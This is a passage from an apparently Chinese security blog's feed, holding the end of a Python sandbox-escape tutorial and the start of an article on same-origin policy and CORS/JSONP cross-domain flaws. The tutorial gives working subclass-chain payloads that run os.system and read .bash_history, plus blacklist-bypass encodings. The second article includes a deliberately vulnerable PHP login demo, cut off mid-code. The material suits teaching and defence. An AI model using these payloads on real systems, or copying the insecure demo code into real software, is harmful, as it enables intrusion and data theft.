class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 缓冲区 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断Python版本</span></span><br><span class="line"><span class="keyword">if</span> (sys.version_info[<span class="number">0</span>]) == <span class="number">3</span>:</span><br><span class="line">    modules = modules3</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    modules = modules2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的标准库</span></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> modules:</span><br><span class="line">    risk_modules[module] = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = __import__(module)  <span class="comment"># 导入模块</span></span><br><span class="line">        attrs = dir(m)          <span class="comment"># 获取属性与方法</span></span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs: <span class="comment"># 若存在危险模块</span></span><br><span class="line">                risk_modules[module].append(method)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路三 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险标准库的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> risk_module <span class="keyword">in</span> risk_modules.keys():</span><br><span class="line">            <span class="keyword">if</span> risk_module == submodule:</span><br><span class="line">                <span class="keyword">for</span> method <span class="keyword">in</span> risk_modules[risk_module]:</span><br><span class="line">                    <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                    print(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, risk_module=risk_module, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路四 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型的特殊方法</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> types:</span><br><span class="line">    <span class="keyword">for</span> method <span class="keyword">in</span> dir(t):</span><br><span class="line">        <span class="comment"># 待比较类型</span></span><br><span class="line">        c = str(t.__getattribute__(method).__class__)</span><br><span class="line">        <span class="comment"># Python2特殊类型</span></span><br><span class="line">        c2 = <span class="string">&quot;&lt;type &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="comment"># Python3特殊类型</span></span><br><span class="line">        c3 = <span class="string">&quot;&lt;class &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> c == c2 <span class="keyword">or</span> c == c3:</span><br><span class="line">            <span class="comment"># 转义双引号</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                t = <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">            print(<span class="string">&quot;&#123;t&#125;.&#123;method&#125;.__class__.__call__&quot;</span>.format(t=t, method=method))</span><br></pre></td></tr></table></figure><h4 id="思路一实例"><a href="#思路一实例" class="headerlink" title="思路一实例"></a>思路一实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">37</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2 </span></span><br><span class="line">object.__subclasses__()[<span class="number">29</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="思路二实例"><a href="#思路二实例" class="headerlink" title="思路二实例"></a>思路二实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三实例"><a href="#思路三实例" class="headerlink" title="思路三实例"></a>思路三实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">170</span>].__init__.__globals__[<span class="string">&#x27;_collections_abc&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三特例"><a href="#思路三特例" class="headerlink" title="思路三特例"></a>思路三特例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路四实例"><a href="#思路四实例" class="headerlink" title="思路四实例"></a>思路四实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].append.__class__.__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>有些时候并不是删掉了某个危险模块，而是设置了一个输入关键字黑名单。如果是利用链中的字符串类型可以通过拼接、编码、倒序等多种方式绕过，如果是方法或属性可以通过同义替换绕过。</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拼接</span></span><br><span class="line"><span class="string">&quot;__im&quot;</span>+<span class="string">&quot;port__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).sy&quot;</span>+<span class="string">&quot;stem(&#x27;who&quot;</span>+<span class="string">&quot;ami&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line">eval(chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">105</span>)+chr(<span class="number">109</span>)+chr(<span class="number">112</span>)+chr(<span class="number">111</span>)+chr(<span class="number">114</span>)+chr(<span class="number">116</span>)+chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">111</span>)+chr(<span class="number">115</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>)+chr(<span class="number">46</span>)+chr(<span class="number">115</span>)+chr(<span class="number">121</span>)+chr(<span class="number">115</span>)+chr(<span class="number">116</span>)+chr(<span class="number">101</span>)+chr(<span class="number">109</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">119</span>)+chr(<span class="number">104</span>)+chr(<span class="number">111</span>)+chr(<span class="number">97</span>)+chr(<span class="number">109</span>)+chr(<span class="number">105</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>))</span><br><span class="line"><span class="comment"># 倒序</span></span><br><span class="line"><span class="string">&quot;)&#x27;imaohw&#x27;(metsys.)&#x27;so&#x27;(__tropmi__&quot;</span>[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h3 id="中括号"><a href="#中括号" class="headerlink" title="中括号"></a>中括号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [].__class__.__bases__[0].__subclasses__()[37]</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="点号"><a href="#点号" class="headerlink" title="点号"></a>点号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),<span class="string">&#x27;__class__&#x27;</span>),<span class="string">&#x27;__bases__&#x27;</span>),<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">0</span>),<span class="string">&#x27;__subclasses__&#x27;</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;class&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;bases&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;getitem&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(<span class="number">0</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;subclasses&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><p>只过滤引号的话可以利用一些通过序号取值的方法，但是如果点号不能用就得用getattr，而getattr又需要用到引号。。。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Python 沙箱逃逸的经验总结</a></p><p><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Python 沙箱逃逸</a></p><p><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/">Python沙箱逃逸总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。&lt;/p&gt;
&lt;h2 id=&quot;导入模块&quot;&gt;&lt;a href=&quot;#导入模块&quot; class=&quot;headerlink&quot; title=&quot;导入模块&quot;&gt;&lt;/a&gt;导入模块&lt;/h2&gt;&lt;p&gt;Python导</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="python" scheme="https://hosch3n.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>同源策略与跨域漏洞</title>
    <link href="https://hosch3n.github.io/2020/08/26/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/"/>
    <id>https://hosch3n.github.io/2020/08/26/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-26T08:48:53.000Z</published>
    <updated>2020-12-06T08:50:54.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为同源"><a href="#何为同源" class="headerlink" title="何为同源"></a>何为同源</h2><p>如果两个URL的协议、域名、端口一致则满足同源，<code>http</code>与<code>https</code>、<code>a.x.com</code>与<code>b.x.com</code>、<code>:80</code>与<code>:81</code>均不符合同源条件。通过<code>windows.open()</code>等方式打开的<code>about:blank</code>空白页将继承上级的源</p><ul><li>IE浏览器中，两个相互信任的白名单域名之间、以及不同端口均不受同源策略限制</li></ul><h2 id="如何跨域"><a href="#如何跨域" class="headerlink" title="如何跨域"></a>如何跨域</h2><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>在处理前后端分离、跨站请求等业务时可能会涉及跨域访问，浏览器出于安全考虑将拦截跨域请求的响应结果（但不会阻止发出跨域请求），除非存在相应的CORS响应头</p><p>满足CORS条件后，浏览器继续将跨域请求细分为 简单型请求 与 预检型请求。只有满足特定HTTP头的<code>GET</code>、<code>POST</code>、<code>HEAD</code>请求为简单请求，否则为预检请求，具体条件见参考链接2</p><p>简单型请求会直接发起请求并响应结果，但预检型请求发起前浏览器会先发起<code>OPTIONS</code>请求用作校验。预检型请求的响应将包含<code>Access-Control-Max-Age</code>响应头用于说明有效时间（秒），在有效时间内不必再次发起预检请求</p><p>若<code>XMLHttpRequest</code>对象的<code>withCredentials</code>属性被设置为<code>true</code>，或是向<code>fetch()</code>方法的<code>init</code>对象传递了<code>credentials: &#39;include&#39;</code>，则其在发送请求时会附带Cookies。但如果响应头缺少<code>Access-Control-Allow-Credentials: true</code>，则浏览器不会展现响应内容</p><ul><li>带Cookies的请求，服务器的<code>Access-Control-Allow-Origin</code>不能为<code>*</code>，即浏览器不会展现如下响应头组合的页面：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></table></figure><h3 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h3><p>有<code>src</code>属性的标签都是可以发起跨域请求的，但仅限于对其原本内容的引用，而不可以对跨域加载的资源进行读写</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONPadding是一个精妙的民间花式跨域方法，通过回调函数配合JSON数据填充来实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com --&gt;</span><br><span class="line"><span class="comment">// 原生JS形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;//b.x.com/?callback=fun&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.getJSON形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $.getJSON(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.ajax形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">&quot;get&quot;</span>, <span class="comment">// 请求方法JSONP默认GET，POST也会转GET</span></span><br><span class="line">            async: <span class="literal">false</span>, <span class="comment">// 异步请求JSONP默认false，true也会转false</span></span><br><span class="line">            url: <span class="string">&quot;//b.x.com/&quot;</span>,</span><br><span class="line">            <span class="comment">// data: &#123;&quot;code&quot; : &quot;CA1405&quot;&#125;, // 传入参数</span></span><br><span class="line">            dataType: <span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line">            jsonp: <span class="string">&quot;callback&quot;</span>,</span><br><span class="line">            <span class="comment">// jsonpCallback:&quot;flightHandler&quot;, // 回调函数名jQuery默认随机，也可以写&quot;?&quot;</span></span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="built_in">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.get形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">$.get(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;<span class="comment">/* ... */</span>&#125;, <span class="string">&#x27;jsonp&#x27;</span>);  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- b.x.com --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">$data = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#x27;</span>.json_encode($data).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="子仗父势"><a href="#子仗父势" class="headerlink" title="子仗父势"></a>子仗父势</h3><p>如果显式地将<code>a.x.com</code>、<code>b.x.com</code>与<code>x.com</code>的<code>document.domain</code>属性同时设置为<code>x.com</code>，则可以同时满足同源条件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    - 此赋值会重写端口为NULL </span></span><br><span class="line"><span class="comment">    - 不影响 XMLHttpRequest 与 fetch</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// a.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="边缘试探"><a href="#边缘试探" class="headerlink" title="边缘试探"></a>边缘试探</h3><p><code>window.name</code>属性伴随一个window的整个声明周期，在此期间iframe内载入的所有页面共享同一个<code>window.name</code>值</p><p><code>postMesage</code>配合监听事件、<code>location.hash</code>配合中间页均有一定跨域效果</p><h2 id="攻击思路一"><a href="#攻击思路一" class="headerlink" title="攻击思路一"></a>攻击思路一</h2><p>若为了方便直接将Origin请求头拼接进CORS响应头，会导致CORS跨域漏洞。假设<code>a.x.com/index.php</code>负责校验身份并设置Cookie，<code>a.x.com/cors.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;user&#x27;</span>]) ? $_POST[<span class="string">&#x27;user&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$passwd = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]) ? $_POST[<span class="string">&#x27;passwd&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($user===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $passwd===<span class="string">&#x27;passwd&#x27;</span>) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;user&#x27;</span>] = $user;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;logout&#x27;</span>]===<span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/json.php?callback=jsonp&quot;&gt;用户信息A&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/cors.php&quot;&gt;用户信息B&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/index.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;悲催的A&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;margin-left: 100px&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;form id=&quot;login&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">        账户：&lt;input id=&quot;user&quot; type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        密码：&lt;input id=&quot;passwd&quot; type=&quot;password&quot; name=&quot;passwd&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $_SESSION[<span class="string">&#x27;user&#x27;</span>].<span class="string">&#x27;登录成功&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/cors.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> 